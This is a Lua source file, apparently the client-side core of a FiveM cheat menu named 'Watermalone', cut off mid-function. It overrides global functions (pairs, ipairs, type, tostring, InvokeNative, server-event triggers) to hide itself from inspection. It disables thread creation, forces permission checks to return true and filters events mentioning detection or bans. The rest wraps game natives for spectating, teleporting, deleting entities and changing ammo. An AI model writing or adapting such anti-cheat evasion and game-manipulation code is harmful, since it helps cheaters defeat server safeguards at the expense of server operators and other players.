local gametime = 0
local identity = {long = "Watermalone",short="wm"}
local wmlua = {}
local wmlua_print = function(...) end
local cin = Citizen.InvokeNative
local sgsub = string.gsub
local t = type
local ts = tostring
local otse = TriggerServerEventInternal
local wm_setmf = false
local wmlua_Thread = CreateThread
local wmlua_Schleep = Wait
local wmlua_pcall = pcall
local returnAsNumber = {}
wmlua_pcall(function()

-- local _, error = wmlua_pcall(function()

--     if #string.dump(CreateThread) == 717 and #string.dump(Wait) == 193 then wm_setmf = true end

-- end)


wm_setmf = true

-- if not wm_setmf then
--     wmlua_Thread = function() end
--     wmlua_Schleep = function() end
-- end

wmlua_Thread(function()

    local wmg = _G
    local wmp = pairs
    
    local oldG = {}
    for k,v in pairs(_G) do
        oldG[k] = _G[k]
    end

    local function wmGS()

        local wmglist = {}
        for k,v in pairs(wmg) do
            if not string.find(k, "wmlua", 1, true) and not string.find(k, "wmlua2", 1, true) then
                wmglist[k] = wmg[k]
            end
        end

        wmglist["_G"] = nil
        wmglist["_G"] = wmglist

        for k,v in wmp(wmg) do
            if _G[k] == wmg then
                _G[k] = wmglist
            end
        end
        
    end

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                wmGS()

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    local function isWMNative(pos)
        local isString
        local isF, isF2
        if t(p1) == "string" then
            isString = true
        else
            isString = false
        end
        local allow = true
        if isString and not string.find(p1, "AddEvent") and not string.find(p1, "Trigger") then isF, isF2 = string.find(p1," ") end
        if isString and isF == 1 and isF2 == 1 then
            local _, count = string.gsub(str, " ", " ")
            if count == 1 then
                return true
            else
                return false
            end
        end
        return false

    end

    function tostring(str)
        local isF, isF2
        local tobestr = ts(str)
        isF, isF2 = string.find(tobestr, " ", 1, true)
        if isF == 1 and isF2 == 1 then
            return tobestr
        else
            return tobestr
        end
    end

    function Citizen.InvokeNative(native, ...)
        local args = {...}
        if native == 2145194280 or native == "0x7FDD1128" then
            return nil
        else
            return cin(native,...)
        end
    end
    
    function TriggerServerEventInternal(e, ...)
        local KEK = msgpack.pack({...})
        if e ~= nil then
            Citizen.InvokeNative(0x7FDD1128, e, KEK, KEK:len())
        end
    end

    if de_wr_hook then
        identity = {long = "uinb9873",short="6j27"}
    end

    CreateThread = function() end
    Citizen.CreateThread = function() end
    
    if checkAllowed and type(checkAllowed) == "function" then
        function checkAllowed()
            return true
        end
    end

    wmlua_Schleep(1000)

    wmlua.i = "Watermalone"
    wmlua.G = wmg
    wmlua.N = {}
    wmlua.F = {}
    wmlua.S = {}
    wmlua.T = {}
    wmlua.V = {}
    wmlua.P = {}
    wmlua.R = {}
    wmlua.I = {}
    wmlua.ST = {}
    wmlua.API = {}
    wmlua.pairs = pairs
    wmlua.msgpack = {}
    wmlua.str = {}
    wmlua.dev = false

    local _, msgpack_error = wmlua_pcall(function()
        string.dump(msgpack.pack)
    end)

    local _, utf8char_error = wmlua_pcall(function()
        string.dump(utf8.char)
    end)

    if utf8char_error then
        wmlua.utf8char = utf8.char
    else
        wmlua.utf8char = function()
            return "si"
        end
    end
    
    if msgpack_error then
        wmlua.msgpack.pack = msgpack.pack
    else
        wmlua.msgpack.pack = function()
            wmlua.F.EventLogInsert("[~r~WM~w~] Error: si")
            wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId()) .. " (" .. wmlua.N.ScGetNickname() .. ")", "Security Issue at msgpack.pack")
        end
    end

    local polakgay = {
        "PointerValueInt",
        "PointerValueFloat",
        "PointerValueVector",
        "ReturnResultAnyway",
        "ResultAsInteger",
        "ResultAsFloat",
        "ResultAsLong",
        "ResultAsString",
        "ResultAsVector",
        "ResultAsObject",
        "InvokeNative",
        "PointerValueIntInitialized",
        "PointerValueFloatInitialized"
    }

    local o_ipairs = ipairs
    function ipairs(p1)
        if wmlua and p1 == wmlua.G then
            return o_ipairs(_G)
        elseif type(p1) == "table" and p1 ~= Citizen then
            for k,v in o_ipairs(polakgay) do
                if type(p1) == "table" and p1[v] then
                    return o_ipairs({})
                end
            end
            return o_ipairs(p1)
        else
            return o_ipairs(p1)
        end
    end

    local o_pairs = pairs
    function pairs(p1)
        if wmlua and p1 == wmlua.G then
            return o_pairs(_G)
        elseif type(p1) == "table" and p1 ~= Citizen then
            for k,v in o_pairs(polakgay) do
                if type(p1) == "table" and p1[v] then
                    return o_pairs({})
                end
            end
            return o_pairs(p1)
        else
            return o_pairs(p1)
        end
    end

    if CKgang or LOL or OnionUI then
        local _t = TriggerServerEvent
        function TriggerServerEvent(...)
            local allowEvent = true
            local rstr = ""
            local lel = {...}
            for k,v in ipairs({...}) do
                if type(v) == "table" then
                    v = json.encode(v)
                else
                    v = tostring(v)
                    if string.find(v, "menu") or string.find(v, "detect") or string.find(v, "ly ban") then
                        allowEvent = false
                    end
                end
                if k ~= #lel then
                    rstr = rstr .. v .. " :: "
                else
                    rstr = rstr .. v
                end
            end
            _t(table.unpack({...}))
        end
    end

    local ts = tostring
    local yepCock = _HAM_
    function tostring(p1)
        if ts(p1) == ts(yepCock) or ts(p1) == "3607903178" or ts(p1) == "-6886964137647574376" then
            return "3348473001"
        else
            return ts(p1)
        end
    end

    local t = type
    function type(p1)
        local isString
        local isF, isF2
        if t(p1) == "string" then
            isString = true
        else
            isString = false
        end
        local allow = true
        if isString and not string.find(p1, "AddEvent") and not string.find(p1, "Trigger") then isF, isF2 = string.find(p1," ") end
        if isString and isF == 1 and isF2 == 1 then
            allow = false
        end
        if isString and not allow then
            return "number"
        end
        if t(p1) == "table" then
            if p1["InvokeNative"] or p1["PointerValueInt"] then
                return "number"
            end
            return t(p1)
        else
            return t(p1)
        end
    end
    
    wmlua.H = Citizen.InvokeNative(_HAM_) or Citizen

    wmlua.H.oldInvoke = wmlua.H.InvokeNative
    
    function wmlua.H.WMInvokeNative(n, ...)
        returnAsNumber[" " .. n] = true
        return wmlua.H.oldInvoke(" " .. n, ...)
    end

    wmlua.B = wmlua.H.WMInvokeNative(69696)

    local leTrace = wmlua.H.Trace
    function wmlua_print(p1)
        leTrace(p1..'\n')
    end

    if t(wmlua.B) == "table" then
        wmlua_load = wmlua.B.wmLoad
        wmlua.codeExec = true
    else
        wmlua.codeExec = false
        wmlua.B = {
            wmExecAt = function(...) end,
            wmGetFile = function(...) end,
            wmLoad = function(...) end,
            wmLoadGet = function(...) end
        }
    end

    if t(wmlua.H) ~= "table" then
        wmlua.H = {}
    end

    function wmlua.F.InsertToTable(tbl, val)
        tbl[#tbl + 1] = val
    end

    function wmlua.S.GenerateString(len)
        local rstr = ""
        for i = 1, len do
            rstr = rstr .. wmlua.utf8char(math.random(97, 122))
        end
        return rstr
    end

    function wmlua.N.GetHashKey(p1)
        if type(p1) == "number" then return p1 end
        return wmlua.H.WMInvokeNative(0xD24D37CC275948CC, tostring(p1), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.DisplayCursor()
        wmlua.H.WMInvokeNative(0xAAE7CE1D63167423)
    end

    function wmlua.N.SetCursor(p1)
        wmlua.H.WMInvokeNative(0x5F4B6931816E599B, p1)
    end

    function wmlua.N.HasStreamedTextureDictLoaded(textureDict)
        return wmlua.H.WMInvokeNative(0x0145F696AAAAD2E4, tostring(textureDict), wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.DrawSprite(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11)
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
            if not wmlua.N.HasStreamedTextureDictLoaded(p1) then
                wmlua.N.RequestStreamedTextureDict(p1, false)
            end
            wmlua.H.WMInvokeNative(0xE7FFAE5EBF23D890, p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11)
        end
    end

    function wmlua.N.AddTextEntry(p1,p2)
        wmlua.H.WMInvokeNative(0x32CA01C3, p1,p2)
    end
    
    function wmlua.N.DisplayKeyboard(p1,p2,p3,p4,p5,p6,p7,p8)
        wmlua.H.WMInvokeNative(0x00DC833F2568DBF6, p1,p2,p3,p4,p5,p6,p7,p8)
    end
    
    function wmlua.N.RequestStreamedTextureDict(p1,p2)
        wmlua.H.WMInvokeNative(0xDFA2EF8E04127DD5, p1,p2)
    end

    function wmlua.N.SetTextFont(p1)
        wmlua.H.WMInvokeNative(0x66E0276CC5F6B9DA, p1)
    end

    function wmlua.N.SetTexEdge(p1,p2,p3,p4,p5)
        wmlua.H.WMInvokeNative(0x441603240D202FA6, p1,p2,p3,p4,p5)
    end

    function wmlua.N.SetTextScale(p1,p2)
        wmlua.H.WMInvokeNative(0x07C837F9A01C34C9, p1,p2)
    end

    function wmlua.N.SetTextDropShadow(p1,p2,p3,p4,p5)
        wmlua.H.WMInvokeNative(0x465C84BC39F1C351,p1,p2,p3,p4,p5)
    end

    function wmlua.N.AttachEntityToEntity(p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15)
        wmlua.H.WMInvokeNative(0x6B9BBD38AB0796DF, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15)
    end

    function wmlua.N.StopScreenEffects()
        wmlua.H.WMInvokeNative(0xB4EDDC19532BFB85)
    end

    function wmlua.N.DrawLine(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10)
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then
            wmlua.H.WMInvokeNative(0x6B7256074AE34680, p1,p2,p3,p4,p5,p6,p7,p8,p9,p10)
        end
    end

    function wmlua.N.FlashMinimap()
        wmlua.H.WMInvokeNative(0xF2DD778C22B15BDA)
    end

    function wmlua.N.SetEntVisible(p1,p2)
        wmlua.H.WMInvokeNative(0xEA1C610A04DB6BBB, p1,p2, 0)
    end

    function wmlua.N.RemoveBlip(p1)
        wmlua.H.WMInvokeNative(0x86A652570E5F25DD, wmlua.H.PointerValueIntInitialized(p1))
    end

    function wmlua.N.DeleteEntity(p1)
        wmlua.H.WMInvokeNative(0xAE3CBE5BF394C9C9, wmlua.H.PointerValueIntInitialized(p1))
    end

    function wmlua.N.SetControlNormal(p1,p2,p3)
        if type(p1) ~= "number" then p1 = tonumber(p1) end
        if type(p2) ~= "number" then p2 = tonumber(p2) end
        if type(p3) ~= "number" then p3 = tonumber(p3) end
        if wmlua.N.GetControlNormal(p1,p2) == 0.0 then
        wmlua.H.WMInvokeNative(0xE8A25867FBA3B05E, p1,p2,p3, wmlua.H.ReturnResultAnyway())
        end
    end

    function wmlua.N.RemovePedWeapon(p1, p2)
        wmlua.H.WMInvokeNative(0x4899CB088EDF59B8, p1, p2)
    end

    function wmlua.N.RequestPTFX(p1)
        wmlua.H.WMInvokeNative(0xB80D8756B4668AB6, p1)
    end

    function wmlua.N.UsePTFX(p1)
        wmlua.H.WMInvokeNative(0x6C38AF3693A69A91, p1)
    end

    function wmlua.N.SpawnPTFX(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11)
        wmlua.H.WMInvokeNative(0xF56B8137DF10135D, p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11)
    end

    function wmlua.N.RenderCam(p1,p2,p3,p4,p5)
        wmlua.H.WMInvokeNative(0x07E5B515DB0636FC, p1,p2,p3,p4,p5)
    end

    function wmlua.N.WadaGM(p1,p2,p3)
        wmlua.H.WMInvokeNative(0x7022BD828FA0B082, p1,p2,p3)
    end

    function wmlua.N.Clear_PedTasks(p1,p2)
        if p2 then
            wmlua.H.WMInvokeNative(0xAAA34F8A7CB32098, p1)
        else
            wmlua.H.WMInvokeNative(0xE1EF3C1216AFF2CD, p1)
        end
    end

    function wmlua.N.SetFocusArea(p1)
        local ax,ay,az = table.unpack(p1)
        wmlua.H.WMInvokeNative(0xBB7454BAFF08FE25, ax,ay,az, 0.0, 0.0, 0.0)
    end

    function wmlua.N.DeleteResourceKvp(p1)
        wmlua.H.WMInvokeNative(0x7389B5DF, p1)
    end

    function wmlua.N.PlacePedInVehicle(p1,p2,p3)
        wmlua.H.WMInvokeNative(0x9A7D091411C5F684, p1, p2, p3)
    end

    function wmlua.N.SetPedNoRagdoll(p1, p2)
        wmlua.H.WMInvokeNative(0xB128377056A54E2A, p1, p2)
    end

    function wmlua.N.SetCanTiresPop(p1, p2)
        wmlua.H.WMInvokeNative(0xEB9DC3C7D8596C46, p1, p2)
    end

    function wmlua.N.SetGamerTagVisibility(p1,p2,p3)
        wmlua.H.WMInvokeNative(0x63BB75ABEDC1F6A0, p1,p2,p3)
    end

    function wmlua.N.SetGamerTagAlpha(p1,p2,p3)
        wmlua.H.WMInvokeNative(0xD48FE545CD46F857, p1,p2,p3)
    end

    function wmlua.N.SetGamerTagColor(p1,p2,p3)
        wmlua.H.WMInvokeNative(0x613ED644950626AE, p1,p2,p3)
    end

    function wmlua.N.GamerTagHealthbarColor(p1,p2)
        wmlua.H.WMInvokeNative(0x3158C77A7E888AB4, p1,p2)
    end

    function wmlua.N.SetEntityRenderCrispy(p1, p2) -- Gotta be edgy lul
        wmlua.H.WMInvokeNative(0x730F5F8D3F0F2050, p1, p2)
    end

    function wmlua.N.RemoveGamerTag(p1)
        wmlua.H.WMInvokeNative(0x31698AA80E0223F8, p1)
    end

    function wmlua.N.DrawSpotLight(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14)
        wmlua.H.WMInvokeNative(0xD0F64B265C8C8B33, p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14)
    end

    function wmlua.N.SetFocusEntity(p1)
        wmlua.H.WMInvokeNative(0x198F77705FA0931D, p1)
    end

    function wmlua.N.DestroyDui(duiObject)
        return wmlua.H.WMInvokeNative(0xa085cb10, duiObject)
    end

    function wmlua.N.SetDrawOrigin(x, y, z, p3)
        return wmlua.H.WMInvokeNative(0xAA0008F3BBB8F416, x, y, z, p3)
    end

    function wmlua.N.ClearDrawOrigin()
        return wmlua.H.WMInvokeNative(0xFF0B610F6BE0D7AF)
    end

    function wmlua.N.CommitRuntimeTexture(tex)
        return wmlua.H.WMInvokeNative(0x19d81f4e, tex)
    end

    function wmlua.N.TaskVehicleTempAction(p1,p2,p3,p4)
        wmlua.H.WMInvokeNative(0xC429DCEEB339E129, p1,p2,p3,p4)
    end

    function wmlua.N.StatSetInt(p1, p2, p3)
        wmlua.H.WMInvokeNative(0xB3271D7AB655B441, p1, p2, p3)
    end

    function wmlua.N.SetEntityAsMissionEntity(p1, p2, p3)
        wmlua.H.WMInvokeNative(0xAD738C3085FE7E11, p1, p2, p3)
    end
    
    function wmlua.N.TaskVehicleDriveWander(ped, vehicle, speed, drivingStyle)
        wmlua.H.WMInvokeNative(0x480142959D337D00, ped, vehicle, speed, drivingStyle)
    end

    function wmlua.N.SetEntityPos(entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
        wmlua.H.WMInvokeNative(0x06843DA7060A026B, entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
    end

    function wmlua.N.GetVehicleNeonLightsColor(vehicle)
        return wmlua.H.WMInvokeNative(0x7619EEE8C886757F, vehicle, wmlua.H.PointerValueInt(), wmlua.H.PointerValueInt(), wmlua.H.PointerValueInt())
    end

    function wmlua.N.IsPedInAnyVehicle(ped, atGetIn)
        return wmlua.H.WMInvokeNative(0x997ABD671D25CA0B, ped, atGetIn, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetBlipAsShortRange(blip, toggle)
        return wmlua.H.WMInvokeNative(0xBE8BE4FE60E27B72, blip, toggle)
    end

    function wmlua.N.SetBlipDisplay(blip, displayId)
        return wmlua.H.WMInvokeNative(0x9029B2F3DA924928, blip, displayId)
    end

    function wmlua.N.SetVehicleDoorsLocked(vehicle, doorLockStatus)
        return wmlua.H.WMInvokeNative(0xB664292EAECF7FA6, vehicle, doorLockStatus)
    end

    function wmlua.N.SetBlipSprite(blip, spriteId)
        return wmlua.H.WMInvokeNative(0xDF735600A4696DAF, blip, spriteId)
    end

    function wmlua.N.SetBlipColor(blip, color)
        return wmlua.H.WMInvokeNative(0x03D7FB09E75D6B7E, blip, color)
    end

    function wmlua.N.SetBlipScale(blip, scale)
        return wmlua.H.WMInvokeNative(0xD38744167B2FA257, blip, scale)
    end

    function wmlua.N.SetVehicleDoorsLockedForAllPlayers(vehicle, toggle)
        return wmlua.H.WMInvokeNative(0xA2F80B8D040727CC, vehicle, toggle)
    end

    function wmlua.N.IsAnyVehicleSeatEmpty(vehicle)
        return wmlua.H.WMInvokeNative(0x2D34FC3BC4ADB780, vehicle, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.DecorSetBool(entity, propertyName, value)
        return wmlua.H.WMInvokeNative(0x6B1E8E2ED1335B71, entity, tostring(propertyName), value, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetEntityVelocity(entity, x, y, z)
        return wmlua.H.WMInvokeNative(0x1C99BB7B6E96D16F, entity, x, y, z)
    end

    function wmlua.N.SetPedRelationshipGroupHash(ped, hash)
        return wmlua.H.WMInvokeNative(0xC80A74AC829DDD92, ped, wmlua.N.GetHashKey(hash))
    end

    function wmlua.N.DeleteVehicle(vehicle)
        return wmlua.H.WMInvokeNative(0xEA386986E786A54F, wmlua.H.PointerValueIntInitialized(vehicle))
    end

    function wmlua.N.IsPedSittingInAnyVehicle(ped)
        return wmlua.H.WMInvokeNative(0x826AA586EDB9FEF8, ped, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetEntityAsNoLongerNeeded(entity)
        return wmlua.H.WMInvokeNative(0xB736A491E64A32CF, wmlua.H.PointerValueIntInitialized(entity)) --[ [ may be optional ] ])
    end

    function wmlua.N.DecorSetFloat(entity, propertyName, value)
        return wmlua.H.WMInvokeNative(0x211AB1DD8D0F363A, entity, tostring(propertyName), value, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetCamCoord(cam, posX, posY, posZ)
        return wmlua.H.WMInvokeNative(0x4D41783FB745E42E, cam, posX, posY, posZ)
    end

    function wmlua.N.NetworkRequestControlOfNetworkId(netId)
        return wmlua.H.WMInvokeNative(0xA670B3662FAFFBD0, netId, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetEntityNoCollisionEntity(entity1, entity2, thisFrameOnly)
        return wmlua.H.WMInvokeNative(0xA53ED5520C07654A, entity1, entity2, thisFrameOnly)
    end

    function wmlua.N.GetPlayer_SprintStaminaRemaining(player)
        return wmlua.H.WMInvokeNative(0x3F9F16F8E65A7ED7, player, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.RestorePlayerStamina(player, p1)
        return wmlua.H.WMInvokeNative(0xA352C1B864CAFD33, player, p1)
    end

    function wmlua.N.SetPedMinGroundTimeForStungun(ped, ms)
        return wmlua.H.WMInvokeNative(0xFA0675AB151073FA, ped, ms)
    end

    function wmlua.N.GetAmmoInPedWeapon(ped, weaponhash)
        return wmlua.H.WMInvokeNative(0x015A522136D7F951, ped, wmlua.N.GetHashKey(weaponhash), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.SetVehicleReduceGrip(vehicle, toggle)
        return wmlua.H.WMInvokeNative(0x222FF6A823D122E2, vehicle, toggle)
    end

    function wmlua.N.SetPedAmmo(ped, weaponHash, ammo)
        return wmlua.H.WMInvokeNative(0x14E56BC5B5DB6A19, ped, wmlua.N.GetHashKey(weaponHash), ammo)
    end

    function wmlua.N.AddAmmoToPed(ped, weaponHash, ammo)
        return wmlua.H.WMInvokeNative(0x78F0424C34306220, ped, wmlua.N.GetHashKey(weaponHash), ammo)
    end

    function wmlua.N.Get_SelectedPedWeapon(ped)
        return wmlua.H.WMInvokeNative(0x0A6DB4965674D243, ped, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.SetPlayerModel(player, model)
        return wmlua.H.WMInvokeNative(0x00A1CADD00108836, player, model)
    end

    function wmlua.N.SetAmmoInClip(ped, weaponHash, ammo)
        return wmlua.H.WMInvokeNative(0xDCD2A934D65CB497, ped, wmlua.N.GetHashKey(weaponHash), ammo, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetEntityRotation(entity, pitch, roll, yaw, rotationOrder, p5)
        return wmlua.H.WMInvokeNative(0x8524A8B0171D5E07, entity, pitch, roll, yaw, rotationOrder, p5)
    end

    function wmlua.N.TaskWarpPedIntoVehicle(ped, vehicle, seat)
        return wmlua.H.WMInvokeNative(0x9A7D091411C5F684, ped, vehicle, seat)
    end

    function wmlua.N.RequestModel(model)
        return wmlua.H.WMInvokeNative(0x963D27A58DF860AC, model)
    end

    function wmlua.N.SetModelAsNoLongerNeeded(model)
        return wmlua.H.WMInvokeNative(0xE532F5D78798DAAB, model)
    end

    function wmlua.N.SetVehicleOnGroundProperly(vehicle)
        return wmlua.H.WMInvokeNative(0x49733E92263139D1, vehicle, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.DrawPoly(x1, y1, z1, x2, y2, z2, x3, y3, z3, red, green, blue, alpha)
        return wmlua.H.WMInvokeNative(0xAC26716048436851, x1, y1, z1, x2, y2, z2, x3, y3, z3, red, green, blue, alpha)
    end

    function wmlua.N.IsToggleModOn(vehicle, modType)
        return wmlua.H.WMInvokeNative(0x84B233A8C8FC8AE7, vehicle, modType, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsVehicleExtraTurnedOn(vehicle, extraId)
        return wmlua.H.WMInvokeNative(0xD2E6822DBFD6C8BD, vehicle, extraId, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsVehicleNeonLightEnabled(vehicle, index)
        return wmlua.H.WMInvokeNative(0x8C4B92553E4766A5, vehicle, index, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsEntityAnObject(entity)
        return wmlua.H.WMInvokeNative(0x8D68C8FD0FACA94E, entity, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsPedStrafing(p1)
        return wmlua.H.WMInvokeNative(0xE45B7F222DE47E09, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.NetworkSetInSpectatorMode(toggle, playerPed)
        return wmlua.H.WMInvokeNative(0x423DE3854BB50894, toggle, playerPed)
    end

    function wmlua.N.GetBlipInfoIdCoord(blip)
        return wmlua.H.WMInvokeNative(0xFA7C7F0AADF25D09, blip, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.IsPedHuman(ped)
        return wmlua.H.WMInvokeNative(0xB980061DA992779D, ped, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetVehicleClass(vehicle)
        return wmlua.H.WMInvokeNative(0x29439776AAA00A62, vehicle, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetEntityVelocity(entity)
        return wmlua.H.WMInvokeNative(0x4805D2B1D8CF94A9, entity, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.SetSeethrough(toggle)
        return wmlua.H.WMInvokeNative(0x7E08924259E08CE0, toggle)
    end

    function wmlua.N.GetGameplayCamCoord()
        return wmlua.H.WMInvokeNative(0x14D6F5678D8F1B37, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.SetVehicleExtraColours(vehicle, pearlescentColor, wheelColor)
        return wmlua.H.WMInvokeNative(0x2036F561ADD12E33, vehicle, pearlescentColor, wheelColor)
    end

    function wmlua.N.SetNewWaypoint(x, y)
        return wmlua.H.WMInvokeNative(0xFE43368D2AA4F2FC, x, y)
    end

    function wmlua.N.GetGameplayCamFov()
        return wmlua.H.WMInvokeNative(0x65019750A0324133, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.HasEntityCollidedWithAnything(entity)
        return wmlua.H.WMInvokeNative(0x8BAD02F0368D9E14, entity, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetGameplayCamRelativeHeading()
        return wmlua.H.WMInvokeNative(0x743607648ADD4587, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.Set_Gameplay_Cam_Raw_Pitch(pitch)
        return wmlua.H.WMInvokeNative(0x759E13EBC1C15C5A, pitch)
    end

    function wmlua.N.DisableGameInput()
        for i = 0, 31 do
            wmlua.H.WMInvokeNative(0x5F4B6931816E599B, i)
        end
    end

    function wmlua.N.NetworkSessionLeaveSinglePlayer()
        return wmlua.H.WMInvokeNative(0x3442775428FD2DAA)
    end

    function wmlua.N.IsEntityOnScreen(entity)
        return wmlua.H.WMInvokeNative(0xE659E47AF827484B, entity, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.HasEntityClearLosToEntity(entity1, entity2, traceType)
        return wmlua.H.WMInvokeNative(0xFCDFF7B72D23A1AC, entity1, entity2, traceType, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetPedConfigFlag(ped, flagId, value)
        return wmlua.H.WMInvokeNative(0x1913FE4CBF41C463, ped, flagId, value)
    end

    function wmlua.N.SetPedFleeAttributes(ped, attributeFlags, enable)
        return wmlua.H.WMInvokeNative(0x70A2D1137C8ED7C9, ped, attributeFlags, enable)
    end

    function wmlua.N.SetVehicleDeformationFixed(vehicle)
        return wmlua.H.WMInvokeNative(0x953DA1E1B12C0491, vehicle)
    end

    function wmlua.N.HasAnimDictLoaded(animDict)
        return wmlua.H.WMInvokeNative(0xD031A9162D01088C, tostring(animDict), wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetPedPathAvoidFire(ped, avoidFire)
        return wmlua.H.WMInvokeNative(0x4455517B28441E60, ped, avoidFire)
    end

    function wmlua.N.HasModelLoaded(model)
        return wmlua.H.WMInvokeNative(0x98A4EB5D89A0C952, model, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetVehiclePetrolTankHealth(vehicle, health)
        return wmlua.H.WMInvokeNative(0x70DB57649FA8D0D8, vehicle, health)
    end
    
    function wmlua.N.Get_FrameCount()
        return wmlua.H.WMInvokeNative(0xFC8202EFC642E6F2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetWaypointBlipEnumId()
        return wmlua.H.WMInvokeNative(0x186E5D252FA50E7D, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, useZ)
        return wmlua.H.WMInvokeNative(0xF1B760881820C952, x1, y1, z1, x2, y2, z2, useZ, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.SetVehicleForceAfterburner(vehicle, p1)
        return wmlua.H.WMInvokeNative(0xB055A34527CB8FD7, vehicle, p1)
    end

    function wmlua.N.ToFloat(value)
        return wmlua.H.WMInvokeNative(0xBBDA792448DB5A89, value, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.DrawInteractiveSprite(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
        return wmlua.H.WMInvokeNative(0x2BC54A8188768488, tostring(textureDict), tostring(textureName), screenX, screenY, width, height, heading, red, green, blue, alpha)
    end

    function wmlua.N.SetGameplayCamRawYaw(yaw)
        return wmlua.H.WMInvokeNative(0x103991D4A307D472, yaw)
    end
    
    function wmlua.N.SetGameplayCamRelativeHeading(heading)
        return wmlua.H.WMInvokeNative(0xB4EC2312F4E5B1F1, heading)
    end

    function wmlua.N.LockMinimapPosition(x, y)
        return wmlua.H.WMInvokeNative(0x1279E861A329E73F, x, y)
    end

    function wmlua.N.SetPedAlertness(ped, value)
        return wmlua.H.WMInvokeNative(0xDBA71115ED9941A6, ped, value)
    end

    function wmlua.N.Get_CurrentPedWeaponEntityIndex(ped)
        return wmlua.H.WMInvokeNative(0x3B390A939AF0B5FC, ped, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.SetPedCombatAbility(ped, p1)
        return wmlua.H.WMInvokeNative(0xC7622C0D36B2FDA8, ped, p1)
    end

    function wmlua.N.IsPedInParachuteFreeFall(ped)
        return wmlua.H.WMInvokeNative(0x7DCE8BDA0F1C1200, ped, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetFirstBlipInfoId(blipSprite)
        return wmlua.H.WMInvokeNative(0x1BEDE233E6CD2A1F, blipSprite, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.SetPlaneTurbulenceMultiplier(vehicle, multiplier)
        return wmlua.H.WMInvokeNative(0xAD2D28A1AFDFF131, vehicle, multiplier)
    end
    
    function wmlua.N.SetGameplay_CamRelativePitch(angle, scalingFactor)
        return wmlua.H.WMInvokeNative(0x6D0858B8EDFD2B7D, angle, scalingFactor)
    end

    function wmlua.N.GetNumVehicleMods(vehicle, modType)
        return wmlua.H.WMInvokeNative(0xE38E9162A2500646, vehicle, modType, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.ToggleVehicleMod(vehicle, modType, toggle)
        return wmlua.H.WMInvokeNative(0x2A1F4F37F95BAD08, vehicle, modType, toggle)
    end

    function wmlua.N.IsModelInCdimage(model)
        return wmlua.H.WMInvokeNative(0x35B9E0803292B641, model, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetMainPlayerBlipId()
        return wmlua.H.WMInvokeNative(0xDCD4EC3F419D02FA, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.SetBlockingOfNonTemporaryEvents(ped, toggle)
